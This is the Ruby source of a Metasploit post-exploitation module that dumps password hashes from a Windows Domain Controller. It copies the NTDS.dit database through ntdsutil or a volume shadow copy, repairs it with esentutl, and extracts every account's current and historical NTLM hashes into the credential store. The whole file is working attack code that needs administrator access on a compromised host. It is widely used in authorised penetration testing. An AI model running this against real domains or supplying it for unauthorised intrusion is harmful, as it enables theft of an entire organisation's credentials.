##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/ntds/parser'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ShadowCopy
  include Msf::Post::File
  include Msf::Post::Windows::ExtAPI

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Domain Controller Hashdump',
        'Description' => %q{
          This module attempts to copy the NTDS.dit database from a live Domain Controller
          and then parse out all of the User Accounts. It saves all of the captured password
          hashes, including historical ones.
        },
        'License' => MSF_LICENSE,
        'Author' => ['theLightCosine'],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [],
          'Reliability' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              extapi_ntds_parse
              stdapi_fs_stat
            ]
          }
        }
      )
    )
    deregister_options('SMBUser', 'SMBPass', 'SMBDomain')
    register_options(
      [
        OptBool.new(
          'CLEANUP', [ true, 'Automatically delete ntds backup created', true]
        )
      ]
    )
  end

  def run
    if preconditions_met?
      print_status 'Pre-conditions met, attempting to copy NTDS.dit'
      ntds_file = copy_database_file
      unless ntds_file.nil?
        file_stat = client.fs.file.stat(ntds_file)
        print_status "NTDS File Size: #{file_stat.size} bytes"
        print_status 'Repairing NTDS database after copy...'
        print_status repair_ntds(ntds_file)
        realm = sysinfo['Domain']
        begin
          ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)
        rescue Rex::Post::Meterpreter::RequestError => e
          print_bad("Failed to properly parse database: #{e}")
          if e.to_s.include? '1004'
            print_bad('Error 1004 is likely a jet database error because the ntds database is not in the regular format')
          end
        end
        unless ntds_parser.nil?
          print_status 'Started up NTDS channel. Preparing to stream results...'
          ntds_parser.each_account do |ad_account|
            print_good ad_account.to_s
            report_hash(ad_account.ntlm_hash.downcase, ad_account.name, realm)
            ad_account.nt_history.each_with_index do |nt_hash, index|
              hash_string = ad_account.lm_history[index] || Metasploit::Credential::NTLMHash::BLANK_LM_HASH
              hash_string << ":#{nt_hash}"
              report_hash(hash_string.downcase, ad_account.name, realm)
            end
          end
        end
        if datastore['cleanup']
          print_status "Deleting backup of NTDS.dit at #{ntds_file}"
          rm_f(ntds_file)
        else
          print_bad "#{ntds_file} requires manual cleanup"
        end
      end
    end
  end

  def copy_database_file
    version = get_version_info
    if version.windows_server?
      if version.build_number.between?(Msf::WindowsVersion::Server2003_SP0, Msf::WindowsVersion::Server2003_SP2)
        print_status 'Using Volume Shadow Copy Method'
        return vss_method
      elsif version.build_number >= Msf::WindowsVersion::Server2008_SP0
        print_status 'Using NTDSUTIL method'
        return ntdsutil_method
      end
    end
    print_error 'This version of Windows is unsupported'
    return nil
  end

  def ntds_exists?
    return false unless ntds_location

    file_exist?("#{ntds_location}\\ntds.dit")
  end

  def ntds_location
    @ntds_location ||= registry_getvaldata('HKLM\\SYSTEM\\CurrentControlSet\\services\\NTDS\\Parameters\\', 'DSA Working Directory')
  end

  def ntdsutil_method
    tmp_path = "#{get_env('%WINDIR%')}\\Temp\\#{Rex::Text.rand_text_alpha(6..13)}"
    command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
    result = cmd_exec('ntdsutil.exe', command_arguments, 90)
    if result.include? 'IFM media created successfully'
      file_path = "#{tmp_path}\\Active Directory\\ntds.dit"
      print_status "NTDS database copied to #{file_path}"
    else
      print_error 'There was an error copying the ntds.dit file!'
      vprint_error result
      file_path = nil
    end
    file_path
  end

  def preconditions_met?
    unless is_admin?
      print_error('This module requires Admin privs to run')
      return false
    end

    print_status('Session has Admin privs')

    unless domain_controller?
      print_error('Host does not appear to be an AD Domain Controller')
      return false
    end

    print_status('Session is on a Domain Controller')

    unless ntds_exists?
      print_error('Could not locate ntds.dit file')
      return false
    end

    unless session.commands.include?(Rex::Post::Meterpreter::Extensions::Extapi::COMMAND_ID_EXTAPI_NTDS_PARSE)
      fail_with(Failure::BadConfig, 'Session does not support Meterpreter ExtAPI NTDS parser')
    end

    session_compat?
  end

  def repair_ntds(path = '')
    arguments = "/p /o \"#{path}\""
    cmd_exec('esentutl', arguments)
  end

  def report_hash(ntlm_hash, username, realm)
    cred_details = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: refname,
      private_type: :ntlm_hash,
      private_data: ntlm_hash,
      username: username,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: realm,
      workspace_id: myworkspace_id
    }
    create_credential(cred_details)
  end

  def session_compat?
    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
      print_error 'You are running 32-bit Meterpreter on a 64 bit system'
      print_error 'Try migrating to a 64-bit process and try again'
      false
    else
      true
    end
  end

  def vss_method
    unless start_vss
      fail_with(Failure::NoAccess, 'Unable to start VSS service')
    end
    location = ntds_location.dup
    location.slice!(0, 3)
    id = create_shadowcopy(volume.to_s)
    print_status "Getting Details of ShadowCopy #{id}"
    sc_details = get_sc_details(id)
    sc_path = "#{sc_details['DeviceObject']}\\#{location}\\ntds.dit"
    target_path = "#{get_env('%WINDIR%')}\\Temp\\#{Rex::Text.rand_text_alpha(6..13)}"
    print_status "Moving ntds.dit to #{target_path}"
    move_file(sc_path, target_path)
    target_path
  end
end
